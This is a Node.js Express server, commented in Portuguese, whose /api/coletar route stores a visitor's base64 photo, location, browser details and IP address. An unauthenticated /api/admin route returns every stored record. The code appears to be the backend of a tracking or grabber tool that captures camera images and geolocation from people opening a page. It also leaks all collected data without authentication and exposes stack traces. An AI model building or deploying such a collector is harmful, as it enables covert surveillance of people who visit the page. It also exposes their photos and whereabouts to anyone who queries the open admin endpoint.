const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== PASTA DE UPLOADS =====
const UPLOAD_DIR = path.join(__dirname, 'uploads');

// Garante que a pasta existe
try {
    if (!fs.existsSync(UPLOAD_DIR)) {
        fs.mkdirSync(UPLOAD_DIR, { recursive: true });
        console.log('📁 Pasta uploads criada');
    }
} catch (err) {
    console.error('❌ Erro ao criar pasta:', err);
}

// ===== MIDDLEWARES =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ===== ARQUIVOS ESTÁTICOS =====
app.use(express.static(path.join(__dirname, 'frontend')));

// ===== ROTA DE TESTE =====
app.get('/api/teste', (req, res) => {
    res.json({ 
        status: 'ok', 
        mensagem: 'Servidor funcionando!',
        timestamp: new Date().toISOString()
    });
});

// ===== ROTA DE COLETA =====
app.post('/api/coletar', (req, res) => {
    console.log('📥 Coleta recebida');
    console.log('📦 Headers:', req.headers);
    console.log('📦 Body:', req.body ? 'Recebido' : 'Vazio');

    try {
        const dados = req.body;
        
        // Verifica se veio algo
        if (!dados || Object.keys(dados).length === 0) {
            console.log('❌ Body vazio');
            return res.status(400).json({ 
                status: 'error', 
                mensagem: 'Dados não enviados' 
            });
        }

        const id = uuidv4();
        const timestamp = Date.now();
        const dataHora = new Date().toISOString();

        console.log(`🆔 ID: ${id}`);

        let fotoSalva = false;
        let fotoBase64 = null;

        // Processa a foto
        if (dados.foto && dados.foto.startsWith('data:image')) {
            try {
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                const nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
                fotoBase64 = dados.foto;
                
                const fotoPath = path.join(UPLOAD_DIR, nomeFoto);
                fs.writeFileSync(fotoPath, base64Data, 'base64');
                fotoSalva = true;
                console.log(`✅ Foto salva: ${nomeFoto}`);
            } catch (err) {
                console.error(`❌ Erro foto: ${err.message}`);
            }
        }

        // Dados para salvar
        const dadosParaSalvar = {
            id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: req.headers['x-forwarded-for'] || req.ip || 'IP não disponível',
            foto: fotoBase64,
            fotoSalva: fotoSalva
        };

        // Salva o JSON
        const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
        fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));
        console.log(`💾 Dados salvos: ${jsonPath}`);

        // Verifica se o arquivo foi criado
        if (fs.existsSync(jsonPath)) {
            console.log('✅ Arquivo confirmado!');
        }

        res.json({ 
            status: 'success', 
            id, 
            fotoSalva, 
            timestamp: dataHora 
        });

    } catch (error) {
        console.error('💥 ERRO:', error);
        res.status(500).json({ 
            status: 'error', 
            mensagem: error.message 
        });
    }
});

// ===== ROTA ADMIN =====
app.get('/api/admin', (req, res) => {
    console.log('📊 Admin acessado');

    try {
        if (!fs.existsSync(UPLOAD_DIR)) {
            console.log('⚠️ Pasta não existe');
            return res.json({ total: 0, arquivos: [] });
        }

        const arquivos = fs.readdirSync(UPLOAD_DIR);
        console.log('📂 Arquivos encontrados:', arquivos);

        const dadosArquivos = arquivos
            .filter(f => f.startsWith('dados_') && f.endsWith('.json'))
            .map(f => {
                const caminho = path.join(UPLOAD_DIR, f);
                try {
                    const conteudo = JSON.parse(fs.readFileSync(caminho, 'utf8'));
                    return {
                        arquivo: f,
                        data: conteudo.timestamp || new Date().toISOString(),
                        conteudo: conteudo
                    };
                } catch (e) {
                    console.error('❌ Erro ao ler:', f, e.message);
                    return null;
                }
            })
            .filter(item => item !== null)
            .sort((a, b) => b.data.localeCompare(a.data));

        console.log(`✅ Retornando ${dadosArquivos.length} registros`);

        res.json({ 
            total: dadosArquivos.length, 
            arquivos: dadosArquivos 
        });

    } catch (error) {
        console.error('💥 ERRO admin:', error);
        res.status(500).json({ 
            erro: error.message,
            stack: error.stack 
        });
    }
});

// ===== ROTA PRINCIPAL =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'index.html'));
});

// ===== ROTA ADMIN HTML =====
app.get('/admin.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'frontend', 'admin.html'));
});

// ===== INICIA O SERVIDOR =====
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ════════════════════════════════════════════
    🚀 SERVIDOR RODANDO
    ════════════════════════════════════════════
    📡 Porta: ${PORT}
    📁 Uploads: ${UPLOAD_DIR}
    🌐 URL: https://coleta-production.up.railway.app
    ════════════════════════════════════════════
    `);
});
